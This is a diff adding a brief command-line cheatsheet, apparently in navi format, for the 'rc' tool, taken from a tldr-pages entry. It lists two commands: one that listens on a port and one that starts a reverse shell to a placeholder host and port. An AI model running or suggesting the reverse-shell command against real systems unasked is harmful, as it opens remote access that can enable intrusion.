@@ -1,0 +1,10 @@
+; This has been extracted from
+; https://github.com/tldr-pages/tldr/blob/master/pages/common/rc.md
+
+% rc, common
+
+# Start listening on a specific port
+rc -lp <port>
+
+# Start a reverse shell
+rc <host> <port> -r <shell>
